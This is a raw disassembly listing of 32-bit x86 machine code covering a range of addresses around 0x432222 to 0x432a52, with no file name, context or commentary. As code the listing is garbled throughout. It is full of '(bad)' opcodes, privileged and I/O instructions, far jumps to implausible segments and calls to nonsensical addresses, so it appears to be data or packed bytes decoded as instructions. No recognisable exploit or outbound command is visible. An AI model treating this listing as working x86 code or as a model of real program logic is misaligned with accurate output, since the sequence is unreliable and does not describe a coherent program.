  432222:	or     BYTE PTR [ecx-0x7a87bb],cl
  432228:	jne    0x4321e2
  43222a:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  432234:	mov    ecx,0xd74fb8
  432239:	add    cl,al
  43223b:	mov    DWORD PTR [ecx-0x3f007784],ecx
  432241:	or     DWORD PTR [ebx+0x558966e4],0x7e
  432248:	(bad)  
  432249:	(bad)  
  43224a:	std    
  43224b:	mov    eax,0x8c2789
  432250:	ret    0x6689
  432253:	adc    BYTE PTR [ebp+0x40],0x8d
  432257:	add    bh,ah
  432259:	mov    WORD PTR [ebp-0x70],ax
  43225d:	(bad)  
  43225e:	ret    0x6605
  432261:	or     BYTE PTR [ebp-0x77],dl
  432264:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  43226b:	loop   0x4321f6
  43226d:	(bad)  
  43226e:	xchg   esi,eax
  43226f:	aam    0xcf
  432271:	out    dx,al
  432272:	mov    DWORD PTR [esi-0x68],edi
  432275:	inc    ebp
  432276:	dec    edx
  432277:	pop    ecx
  432278:	mov    edx,DWORD PTR [eax]
  43227a:	repnz push bp
  43227d:	or     BYTE PTR [ebx+0x5510663a],0x49
  432284:	(bad)  
  432285:	repnz cmp eax,0xa0898945
  43228b:	mov    ah,0x89
  43228d:	jmp    DWORD PTR [edx+0x66b0418d]
  432293:	inc    DWORD PTR [ebp+0x50]
  432296:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43229a:	mov    DWORD PTR [eax],ecx
  43229c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43229d:	pop    es
  43229e:	inc    ecx
  43229f:	(bad)  
  4322a0:	cwd    
  4322a2:	inc    ebp
  4322a3:	xor    ah,BYTE PTR [esi+0x3]
  4322a6:	dec    ebp
  4322a7:	push   eax
  4322a8:	inc    bp
  4322aa:	jge    0x43222f
  4322ac:	mov    esp,DWORD PTR [esi-0x18]
  4322af:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4322b5:	add    DWORD PTR [ebx],esi
  4322b7:	add    BYTE PTR [ebx],al
  4322b9:	test   DWORD PTR [ebx],esi
  4322bb:	(bad)  
  4322bc:	inc    WORD PTR [ebp+0x0]
  4322c0:	mov    eax,DWORD PTR [eax]
  4322c2:	call   0x8898d9f7
  4322c7:	mov    esi,eax
  4322c9:	clc    
  4322ca:	ret    
  4322cb:	rol    cl,0xa
  4322ce:	mov    DWORD PTR ds:0x7c0ec88,esi
  4322d4:	mov    edx,edi
  4322d6:	pushf  
  4322d7:	pop    es
  4322d8:	jmp    DWORD PTR [edx+0x66]
  4322db:	add    BYTE PTR [ebp-0x990175],al
  4322e1:	inc    ebp
  4322e2:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4322e8:	push   ebp
  4322e9:	mov    edi,eax
  4322eb:	mov    dh,BYTE PTR [eax+0x266ff51]
  4322f1:	push   ebp
  4322f2:	add    BYTE PTR [ebx-0x764b0777],al
  4322f8:	dec    DWORD PTR [esi+0x661851e8]
  4322fe:	add    BYTE PTR [ebp-0x7b],dl
  432301:	cmp    esi,0x3
  432304:	dec    DWORD PTR [ecx+0x51fe9285]
  43230a:	jmp    DWORD PTR [esi-0x75]
  43230d:	push   ebp
  43230e:	hlt    
  43230f:	data16 (bad) 
  432311:	dec    ebp
  432312:	ret    
  432313:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432319:	lea    edx,[eax-0x1]
  43231c:	jne    0x4322ef
  43231e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  432324:	dec    BYTE PTR [ecx+0x51559eff]
  43232a:	mov    DWORD PTR [esi-0x4c],esp
  43232d:	push   ebp
  43232e:	jmp    DWORD PTR [esi-0x18]
  432331:	inc    ebp
  432332:	sbb    BYTE PTR [ebp-0x767ad900],cl
  432338:	(bad)  
  432339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43233a:	inc    eax
  43233c:	test   DWORD PTR [esi-0x2],esp
  43233f:	inc    ebp
  432340:	dec    DWORD PTR [ebp-0x760bde75]
  432346:	(bad)  
  432347:	test   al,0xc3
  432349:	mov    DWORD PTR [ebp-0x769b56],ecx
  43234f:	lods   al,BYTE PTR ds:[esi]
  432350:	push   eax
  432351:	inc    ebp
  432352:	jne    0x432363
  432354:	dec    DWORD PTR [ebp+0x8]
  432357:	mov    eax,DWORD PTR [edi]
  432359:	sbb    al,0x0
  43235b:	(bad)  
  43235c:	mov    eax,0xc14fc3
  432361:	mov    DWORD PTR [eax-0x64],edi
  432364:	inc    bp
  432366:	test   DWORD PTR [edi],ecx
  432368:	dec    DWORD PTR [ebp-0x1]
  43236b:	xor    eax,edi
  43236d:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  432373:	inc    ebp
  432374:	xor    DWORD PTR [ebx],0x43
  432377:	mov    WORD PTR [ebp-0x1bc],ax
  43237e:	lea    ecx,[ecx-0x7677fe]
  432384:	inc    esi
  432385:	(bad)  
  432386:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43238d:	pushf  
  43238e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432395:	add    bh,bh
  432397:	add    BYTE PTR [edi],cl
  432399:	test   DWORD PTR [eax],eax
  43239b:	(bad)  
  43239c:	dec    WORD PTR [ebp-0xff002d]
  4323a3:	mov    DWORD PTR [eax-0x48],esi
  4323a6:	add    bh,bh
  4323a8:	lea    cx,[ebp-0x50]
  4323af:	push   eax
  4323b0:	rol    BYTE PTR [ebp+0x0],1
  4323b3:	xor    esp,DWORD PTR [esi+0x3]
  4323b6:	lea    edx,[eax-0x1]
  4323b9:	test   edi,edi
  4323bb:	dec    DWORD PTR [ebp-0x1]
  4323be:	mov    edi,edi
  4323c0:	dec    eax
  4323c1:	clc    
  4323c2:	call   DWORD PTR [ebp-0x73]
  4323c5:	lea    esi,[eax+0x51ffff88]
  4323cb:	lea    ecx,[ebp-0x78]
  4323ce:	test   WORD PTR [ebp-0x2],ax
  4323d5:	popf   
  4323d6:	push   ecx
  4323d7:	add    BYTE PTR [ecx-0x77],dl
  4323da:	xor    edi,DWORD PTR [eax-0x724a007d]
  4323e0:	cdq    
  4323e1:	mov    al,0x32
  4323e3:	inc    DWORD PTR [ebx]
  4323e5:	push   eax
  4323e6:	push   ecx
  4323e7:	inc    ebp
  4323e8:	shl    BYTE PTR [ebx],1
  4323ea:	lea    eax,[ebx]
  4323ec:	call   DWORD PTR [eax-0x1]
  4323ef:	test   DWORD PTR [ebx],esi
  4323f1:	inc    DWORD PTR [eax-0x1]
  4323f4:	(bad)  
  4323f5:	(bad)  
  4323f6:	(bad)  
  4323f7:	clc    
  4323f8:	call   DWORD PTR [ebp+0x50]
  4323fb:	jmp    0xcc2575
  432400:	inc    esp
  432401:	jae    0x432402
  432403:	add    BYTE PTR [ecx-0x384f73],cl
  432409:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43240f:	mov    eax,DWORD PTR [ecx]
  432411:	data16 add BYTE PTR [ebp-0xb50077],al
  432418:	inc    eax
  43241a:	lea    esp,[esi+0x1c]
  43241d:	test   DWORD PTR [ecx-0xb301],ecx
  432423:	inc    edi
  432424:	(bad)  
  432425:	dec    si
  432427:	test   edi,edi
  432429:	push   DWORD PTR [ecx]
  43242b:	(bad)  
  43242c:	jnp    0x43247d
  43242e:	(bad)  
  43242f:	mov    edx,DWORD PTR [edx-0x7d]
  432432:	(bad)  
  432433:	mov    ebx,0x563a8935
  432438:	(bad)  
  432439:	call   FWORD PTR [esi-0x47]
  43243c:	inc    DWORD PTR ds:0x893000e2
  432442:	(bad)  
  432443:	pop    eax
  432444:	mov    ah,0xff
  432446:	(bad)  
  432447:	mov    ecx,0x5745
  43244c:	dec    DWORD PTR [ecx-0xf7a501]
  432452:	(bad)  
  432453:	mov    ecx,0x456108
  432458:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  43245e:	test   BYTE PTR [ebp-0x72ff23fd],cl
  432464:	inc    BYTE PTR gs:[eax]
  432467:	inc    DWORD PTR [ebp-0x73]
  43246a:	ss (bad) 
  43246c:	pushf  
  43246d:	inc    edi
  43246f:	mov    ebx,eax
  432471:	hlt    
  432472:	test   DWORD PTR [ecx-0xbab708],ecx
  432478:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  43247e:	lock into 
  432480:	test   eax,eax
  432482:	clc    
  432483:	mov    ebx,0x367245
  432488:	lahf   
  432489:	retf   
  43248a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432490:	add    edi,edi
  432492:	add    BYTE PTR [ecx+0x45],dl
  432495:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43249c:	mov    edx,DWORD PTR [ecx-0x74]
  43249f:	inc    DWORD PTR [eax]
  4324a1:	cld    
  4324a2:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4324a8:	add    BYTE PTR [ebp-0x1b0177],al
  4324ae:	jge    0x4324f5
  4324b0:	test   DWORD PTR [ebx+0xff9875],ecx
  4324b6:	sbb    BYTE PTR [esi+0x55],ah
  4324b9:	xchg   ebp,eax
  4324ba:	call   0x431fbe
  4324bf:	push   edi
  4324c0:	inc    ebp
  4324c1:	mov    dx,WORD PTR [ebp-0xfc0075]
  4324c8:	cmp    al,0x85
  4324ca:	ud0    eax,DWORD PTR [ebp-0x1]
  4324ce:	test   DWORD PTR [edi+0x74],ecx
  4324d1:	dec    edi
  4324d2:	inc    DWORD PTR [ebp-0xf70004]
  4324d8:	dec    DWORD PTR [edi-0x75]
  4324db:	dec    edi
  4324dc:	cld    
  4324dd:	test   DWORD PTR [eax+0xff01ff],eax
  4324e3:	icebp  
  4324e4:	add    BYTE PTR [edi-0x3a],cl
  4324e7:	test   ebx,eax
  4324e9:	inc    BYTE PTR [ebp-0x1]
  4324ec:	jne    0x4324ee
  4324ee:	mov    eax,DWORD PTR [eax]
  4324f0:	cld    
  4324f1:	xor    BYTE PTR [ecx+0x500155],cl
  4324f7:	push   ebp
  4324f8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4324fe:	add    BYTE PTR [ebp+0x35e90f50],al
  432504:	add    al,BYTE PTR [eax]
  432506:	add    BYTE PTR [ebx-0x38fe4f80],al
  43250c:	add    ah,ch
  43250e:	or     BYTE PTR [ebp+0x4501f845],dh
  432514:	jmp    0xdf280f
  432519:	(bad)  
  43251a:	nop    ecx
  43251d:	test   DWORD PTR [ebp+0x4502f8],eax
  432523:	cmp    BYTE PTR [ebp-0x64],cl
  432526:	mov    eax,edi
  432528:	mov    ebx,DWORD PTR [eax+edx*2]
  43252b:	add    eax,0x45fef885
  432530:	dec    DWORD PTR [ebx+0x339445]
  432536:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43253c:	dec    DWORD PTR [ebx-0x460f0375]
  432542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432543:	add    esi,edi
  432545:	add    bh,bh
  432547:	rdpmc  
  432549:	add    BYTE PTR [ebx],0x1
  43254c:	mov    DWORD PTR [eax],eax
  43254e:	add    al,0x45
  432550:	dec    DWORD PTR [ecx-0x360b3373]
  432556:	dec    DWORD PTR [esi]
  432558:	push   eax
  432559:	jne    0x4325a0
  43255b:	mov    esi,DWORD PTR [ebx]
  43255d:	cld    
  43255e:	add    ebp,ebx
  432560:	push   eax
  432561:	inc    DWORD PTR [ebp-0x75]
  432564:	add    eax,0x800e4
  432569:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43256f:	mov    DWORD PTR [ecx],eax
  432571:	sbb    al,0x0
  432573:	leave  
  432574:	test   DWORD PTR [edi-0x2],eax
  432577:	jne    0x432578
  432579:	call   0xff44107e
  43257e:	xor    BYTE PTR [ebp+0x4d],al
  432581:	mov    edi,edi
  432583:	enter  0x8,0x4d
  432587:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43258d:	mov    eax,DWORD PTR [eax]
  43258f:	cld    
  432590:	add    DWORD PTR [ecx],ebx
  432592:	inc    ebp
  432593:	dec    ebp
  432594:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43259a:	inc    eax
  43259b:	dec    DWORD PTR [ecx-0x270375]
  4325a1:	add    BYTE PTR [ebx-0x39d72701],cl
  4325a7:	xchg   ecx,eax
  4325a8:	ret    
  4325a9:	add    BYTE PTR [ebp-0x830075],al
  4325af:	add    BYTE PTR [ebp-0x75],al
  4325b2:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4325b8:	lea    edi,[edi-0xc]
  4325bb:	add    bh,bh
  4325bd:	mov    edx,DWORD PTR [eax-0x7b]
  4325c0:	inc    ebp
  4325c1:	rdpmc  
  4325c3:	jne    0x4325c8
  4325c5:	add    BYTE PTR [eax-0x75],dl
  4325c8:	inc    ebp
  4325c9:	clc    
  4325ca:	add    eax,0x400009
  4325cf:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4325d5:	mov    eax,DWORD PTR [ecx]
  4325d7:	in     al,dx
  4325d8:	add    dh,al
  4325da:	test   ebx,eax
  4325dc:	inc    BYTE PTR [ebp-0xff0001]
  4325e2:	add    BYTE PTR [ebp-0x43],al
  4325e5:	cmp    esi,0xfffffff8
  4325e8:	(bad)  
  4325e9:	push   DWORD PTR [eax]
  4325eb:	add    BYTE PTR [ebp-0x3a],dl
  4325ee:	test   ebx,eax
  4325f0:	je     0x432577
  4325f2:	mov    edi,edi
  4325f4:	sbb    al,0xff
  4325f6:	test   DWORD PTR gs:[eax],eax
  4325f9:	(bad)  
  4325fa:	js     0x4325fb
  4325fc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432602:	sub    eax,ebx
  432604:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43260a:	add    eax,DWORD PTR [eax]
  43260c:	dec    ebp
  43260d:	push   eax
  43260e:	mov    al,BYTE PTR [ebp+0x1]
  432611:	mov    eax,DWORD PTR [ebp-0x68]
  432614:	mov    eax,DWORD PTR [eax]
  432616:	sbb    bh,al
  432618:	or     ah,dh
  43261a:	dec    ebp
  43261b:	inc    DWORD PTR [eax+0x4]
  43261e:	push   ecx
  43261f:	add    BYTE PTR [edx-0x1],dh
  432622:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  432628:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  432632:	add    ecx,DWORD PTR [ecx-0x1be77477]
  432638:	push   ecx
  432639:	cmp    BYTE PTR [ebx],al
  43263b:	inc    ebp
  43263c:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  432642:	(bad)  
  432643:	(bad)  
  432644:	in     al,0xff
  432646:	add    BYTE PTR [ebp+0x0],al
  432649:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43264f:	add    al,bh
  432651:	(bad)  
  432652:	jmp    0x8d85:0x74b0558d
  432659:	dec    DWORD PTR [eax]
  43265b:	call   DWORD PTR [ebp-0x7b]
  43265e:	mov    edi,esi
  432660:	lock call DWORD PTR [ebp-0x75]
  432664:	mov    esi,esp
  432666:	mov    ah,0xc6
  432668:	mov    bh,0xc3
  43266a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  432670:	add    DWORD PTR [eax],0x450050ff
  432676:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43267c:	inc    edi
  43267e:	push   esp
  432680:	jmp    0xcd00:0x670481ff
  432687:	mov    DWORD PTR [ebx],esi
  432689:	clc    
  43268a:	cmp    edi,0xff9cff3b
  432690:	jne    0x43269a
  432692:	mov    eax,eax
  432694:	add    esi,DWORD PTR [eax]
  432696:	int3   
  432697:	inc    ebp
  432698:	cmp    al,0x83
  43269a:	add    BYTE PTR [eax],bl
  43269c:	adc    DWORD PTR [ebx+0x768b5055],eax
  4326a2:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4326a8:	mov    edi,eax
  4326aa:	cmp    BYTE PTR [ebp+0x45],cl
  4326ad:	jmp    0x43263a
  4326af:	mov    ebx,DWORD PTR [esp+ebp*8]
  4326b2:	inc    ebp
  4326b3:	or     al,0x2
  4326b5:	dec    DWORD PTR [ebp+0x18]
  4326b8:	jne    0x43270f
  4326ba:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4326c0:	mov    edi,DWORD PTR [ebx]
  4326c2:	in     al,0x50
  4326c4:	xchg   ecx,eax
  4326c5:	jmp    0x34375ca
  4326ca:	adc    al,0x8b
  4326cc:	inc    ebp
  4326cd:	mov    al,ds:0x8b04008b
  4326d2:	push   ebp
  4326d3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4326d9:	push   ebp
  4326da:	test   DWORD PTR [ebx-0x2800d701],ecx
  4326e0:	inc    ebp
  4326e1:	dec    ebp
  4326e2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4326e8:	mov    DWORD PTR [eax],0xe9ff00f4
  4326ee:	add    al,0x0
  4326f0:	add    BYTE PTR [eax],al
  4326f2:	mov    eax,edx
  4326f4:	push   eax
  4326f5:	rol    DWORD PTR [ebp-0xf0177],1
  4326fb:	bound  eax,QWORD PTR [ebp+0x50]
  4326fe:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432704:	add    BYTE PTR [ecx+0x558df0ff],cl
  43270a:	mov    al,0xf
  43270c:	test   DWORD PTR [edx],edx
  43270e:	call   DWORD PTR [ebp-0x7a0001]
  432714:	(bad)  
  432715:	loop   0x432716
  432717:	jnp    0xc6991b1d
  43271d:	mov    eax,ebx
  43271f:	cmp    al,0x8b
  432721:	(bad)  
  432722:	cld    
  432723:	shr    esi,0xc
  432726:	add    dl,al
  432728:	push   eax
  432729:	lea    eax,[ebp-0x1]
  43272c:	mov    edx,esi
  43272e:	cwde   
  43272f:	cli    
  432730:	add    BYTE PTR [ebp+0x1ffff8ff],al
  432736:	or     BYTE PTR [eax],cl
  432738:	inc    ebp
  432739:	dec    ebp
  43273a:	inc    DWORD PTR [ebx+0x74803914]
  432740:	add    DWORD PTR [ebx+0x451800],ecx
  432746:	call   DWORD PTR [eax+edx*1]
  432749:	add    ecx,DWORD PTR [ebp-0x34]
  43274c:	push   edi
  43274d:	adc    al,0x8
  43274f:	mov    edx,DWORD PTR [ebp-0x14]
  432752:	mov    ecx,DWORD PTR [ebp+0x18]
  432755:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  432759:	inc    DWORD PTR [eax+esi*8]
  43275c:	inc    ebp
  43275d:	stos   BYTE PTR es:[edi],al
  43275e:	mov    edx,DWORD PTR [ebp-0x4]
  432761:	add    DWORD PTR [ebp-0x1c],eax
  432764:	mov    edx,DWORD PTR [ebp-0x70]
  432767:	cmp    eax,DWORD PTR [eax]
  432769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43276a:	mov    eax,DWORD PTR [eax]
  43276c:	cld    
  43276d:	jae    0x4326ef
  43276f:	add    eax,DWORD PTR [ecx]
  432771:	clc    
  432772:	add    BYTE PTR [eax+0x30],dl
  432775:	mov    DWORD PTR [ecx],esi
  432777:	clc    
  432778:	pop    ds
  432779:	inc    ebp
  43277a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432780:	(bad)  
  432781:	push   DWORD PTR [edi]
  432783:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432789:	(bad)  
  43278a:	jae    0x43278b
  43278c:	mov    eax,DWORD PTR [ebp-0x740175]
  432792:	sub    eax,DWORD PTR [eax]
  432794:	add    eax,DWORD PTR [eax]
  432796:	mov    DWORD PTR [ecx+0x5f],eax
  432799:	mov    DWORD PTR [ebx-0x4],ebx
  43279c:	ret    0xff
  43279f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4327a5:	ret    
  4327a6:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4327ac:	add    BYTE PTR [ebp-0x7d],al
  4327af:	mov    DWORD PTR [eax],eax
  4327b1:	add    al,0x84
  4327b3:	inc    DWORD PTR [ecx]
  4327b5:	lea    eax,[eax]
  4327b7:	hlt    
  4327b8:	sar    bh,cl
  4327ba:	test   BYTE PTR [eax+0x1],dl
  4327bd:	inc    ebp
  4327be:	add    BYTE PTR [ebx],dh
  4327c0:	test   BYTE PTR [ebx],0x84
  4327c3:	push   eax
  4327c4:	add    BYTE PTR [ebp+0x0],al
  4327c7:	add    eax,0x86
  4327cc:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4327d2:	add    BYTE PTR [ecx],al
  4327d4:	add    BYTE PTR [eax],al
  4327d6:	mov    esi,0x550030
  4327db:	mov    ecx,DWORD PTR [edi]
  4327dd:	cld    
  4327de:	fidiv  DWORD PTR [ebp+0x0]
  4327e1:	mov    edi,DWORD PTR [ecx]
  4327e3:	xor    BYTE PTR [eax+eax*1],0x84
  4327e7:	add    eax,DWORD PTR [eax]
  4327e9:	sbb    BYTE PTR [eax],al
  4327eb:	jne    0x43279e
  4327ed:	mov    eax,DWORD PTR [ecx]
  4327ef:	sbb    BYTE PTR [eax],al
  4327f1:	mov    DWORD PTR [ebp-0x1],esp
  4327f4:	add    BYTE PTR [eax+0x30e45ca],bh
  4327fa:	ret    0xb7fc
  4327fd:	dec    ebp
  4327fe:	or     al,0x89
  432800:	dec    ebp
  432801:	cld    
  432802:	cmovne ecx,DWORD PTR [eax-0x75]
  432806:	add    edi,esp
  432808:	seto   BYTE PTR [esi-0x72ffffff]
  43280f:	inc    ebp
  432810:	adc    al,0x8b
  432812:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432819:	cmp    DWORD PTR [edi+0x72],edx
  43281c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  432822:	gs cmp al,0x0
  432825:	je     0x4327fd
  432827:	push   eax
  432828:	sar    BYTE PTR [eax],1
  43282a:	mov    bh,0x3e
  43282c:	push   cs
  43282d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  432833:	add    DWORD PTR [ecx+0x12],ebp
  432836:	dec    edx
  432837:	(bad)  
  432838:	mov    eax,edx
  43283a:	in     al,dx
  43283b:	adc    DWORD PTR [ecx],esi
  43283d:	pop    esi
  43283e:	inc    ecx
  43283f:	leave  
  432840:	or     DWORD PTR [eax],ebx
  432842:	gs push ebp
  432844:	add    ah,ch
  432846:	into   
  432847:	in     al,dx
  432848:	enter  0xb756,0xf0
  43284c:	push   cs
  43284d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  432857:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43285d:	jnp    0x7443ad65
  432863:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  432869:	add    BYTE PTR [edi],cl
  43286b:	mov    edi,DWORD PTR [ecx-0x78]
  43286e:	ltr    WORD PTR [ecx-0x7b]
  432872:	dec    DWORD PTR [edi]
  432874:	clc    
  432875:	out    0x45,eax
  432877:	add    BYTE PTR [eax],cl
  432879:	cmp    ebx,0xffffff8c
  43287c:	jge    0x43287e
  43287e:	jb     0x432890
  432880:	je     0x522900
  432886:	pop    edx
  432887:	push   esi
  432888:	mov    ecx,DWORD PTR [edi]
  43288a:	in     al,dx
  43288b:	rol    DWORD PTR [ebp+0x0],1
  43288e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432895:	cmp    DWORD PTR [ecx],0xfffffff0
  432898:	hlt    
  432899:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43289f:	(bad)  
  4328a1:	push   eax
  4328a2:	jns    0xb8430d20
  4328a8:	lock push cs
  4328aa:	ror    edx,0x3
  4328ad:	test   BYTE PTR [ecx+0x5500e800],cl
  4328b3:	dec    eax
  4328b4:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4328b8:	(bad)  
  4328b9:	mov    esi,0x7f33ff5f
  4328be:	inc    eax
  4328bf:	test   DWORD PTR [edx],eax
  4328c1:	je     0x432883
  4328c3:	mov    ecx,ecx
  4328c5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4328c9:	and    eax,DWORD PTR [eax+0xf0103]
  4328cf:	jp     0x4328bd
  4328d1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4328d5:	add    edx,DWORD PTR [edi+0x74]
  4328d8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4328de:	add    BYTE PTR [ebp-0x74c48bbb],al
  4328e4:	je     0x432869
  4328e6:	cmp    eax,edi
  4328e8:	js     0x43290d
  4328ea:	add    eax,0xeb0fc003
  4328ef:	jns    0x43287c
  4328f1:	vmread DWORD PTR [ecx+0x45],ebx
  4328f5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4328fb:	adc    al,0x8b
  4328fd:	jge    0x432913
  4328ff:	mov    edi,DWORD PTR [eax-0x4]
  432902:	add    edi,DWORD PTR [edi]
  432904:	or     bh,bh
  432906:	push   ebp
  432907:	push   es
  432908:	mov    DWORD PTR [ebp-0x4],ebx
  43290b:	add    edi,esi
  43290d:	pop    es
  43290e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432914:	mov    DWORD PTR [esp+esi*8],ecx
  432917:	inc    ebp
  432918:	pop    ebp
  432919:	xor    DWORD PTR [esi-0x4],0x3b
  43291d:	add    edx,DWORD PTR [ecx+edi*1]
  432920:	push   es
  432921:	clc    
  432922:	mov    bh,0xdb
  432924:	jp     0x4328dd
  432926:	add    cl,BYTE PTR [esi]
  432928:	div    DWORD PTR [edi+0x4d8b0c1c]
  43292e:	test   edi,edi
  432930:	je     0x432926
  432932:	mov    eax,ecx
  432934:	or     BYTE PTR [ebx],al
  432936:	dec    BYTE PTR [ecx+0x7d3bec7d]
  43293c:	jbe    0x4329b0
  43293e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  432944:	add    ecx,DWORD PTR [esi]
  432946:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  43294c:	add    eax,DWORD PTR [ebx-0x287af783]
  432952:	je     0x4329a1
  432954:	mov    DWORD PTR [ecx],edi
  432956:	mov    esi,eax
  432958:	hlt    
  432959:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  432960:	jb     0x432922
  432962:	jmp    0x43294f
  432964:	xor    esi,DWORD PTR [ebx]
  432966:	pop    edi
  432967:	pop    esi
  432968:	pop    ebx
  432969:	ret    
  43296a:	ret    0x8b
  43296d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  432973:	xor    DWORD PTR [esi],0xc
  432976:	pushf  
  432977:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  43297d:	(bad)  
  43297f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432986:	dec    ebp
  432987:	ret    
  432988:	mov    edi,DWORD PTR [esi-0x4]
  43298b:	pop    eax
  43298c:	dec    ebp
  43298d:	jne    0x43291a
  43298f:	xor    edi,esp
  432991:	inc    eax
  432992:	dec    ebp
  432993:	jbe    0x4329e8
  432995:	inc    eax
  432996:	pop    ebp
  432997:	add    edx,DWORD PTR [esi+0x8]
  43299a:	push   ecx
  43299b:	dec    eax
  43299c:	push   ecx
  43299d:	mov    eax,edi
  43299f:	and    al,0xf0
  4329a1:	jo     0x43298e
  4329a3:	mov    eax,DWORD PTR [ebx]
  4329a5:	sbb    BYTE PTR [ebp+0x4d],cl
  4329a8:	mov    eax,DWORD PTR [ebx]
  4329aa:	nop
  4329ab:	or     BYTE PTR [eax],al
  4329ad:	jne    0x432a06
  4329af:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  4329b5:	cld    
  4329b6:	xor    edi,edi
  4329b8:	add    edi,DWORD PTR [ebp+0x3]
  4329bb:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4329c1:	js     0x432947
  4329c3:	jae    0x4329c7
  4329c5:	(bad)  
  4329c7:	xor    al,0x5d
  4329c9:	jmp    0x432956
  4329cb:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4329d2:	fdecstp 
  4329d4:	test   BYTE PTR [edi],ah
  4329d6:	add    bh,BYTE PTR [ebp+0x0]
  4329d9:	add    ebx,DWORD PTR [ebp-0x77]
  4329dc:	mov    edi,eax
  4329de:	cmp    al,0x0
  4329e1:	adc    dh,BYTE PTR [ebx]
  4329e3:	jge    0x4329e8
  4329e5:	mov    edi,DWORD PTR [ebx]
  4329e7:	jl     0x4329f8
  4329e9:	clc    
  4329ea:	dec    edi
  4329eb:	jge    0x4329ed
  4329ed:	mov    eax,DWORD PTR [ebx]
  4329ef:	jb     0x4329f9
  4329f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4329f4:	mov    edi,edi
  4329f6:	xor    edx,DWORD PTR [eax]
  4329f8:	add    edi,DWORD PTR [ebx]
  4329fa:	mov    DWORD PTR [ebp-0x10],edi
  4329fd:	inc    edi
  4329fe:	pop    ebp
  4329ff:	jge    0x432a3c
  432a01:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432a05:	mov    edx,0xc05d87f0
  432a0a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  432a0e:	fimul  WORD PTR [eax]
  432a10:	fist   WORD PTR [ebp+0x1c]
  432a13:	in     al,dx
  432a14:	jne    0x432a02
  432a16:	mov    edi,DWORD PTR [edx-0x7a27a10]
  432a1c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432a20:	fdivp  st(0),st
  432a22:	fild   WORD PTR [ebp+0x4510f85c]
  432a28:	test   BYTE PTR [ebx+0x4d00fc02],cl
  432a2e:	inc    ebp
  432a2f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432a35:	mov    ebp,DWORD PTR [ebx-0x4]
  432a38:	adc    al,0x8b
  432a3a:	rcl    DWORD PTR [eax],0x48
  432a3d:	mov    esi,0x7080803
  432a42:	fiadd  WORD PTR [ebp+0x4d]
  432a45:	mov    WORD PTR [ebx+0x558bfc52],cs
  432a4b:	cld    
  432a4c:	xor    ebx,DWORD PTR [ebx+0x330103]
  432a52:	mov    DWORD PTR [edi+0x872dc],edi
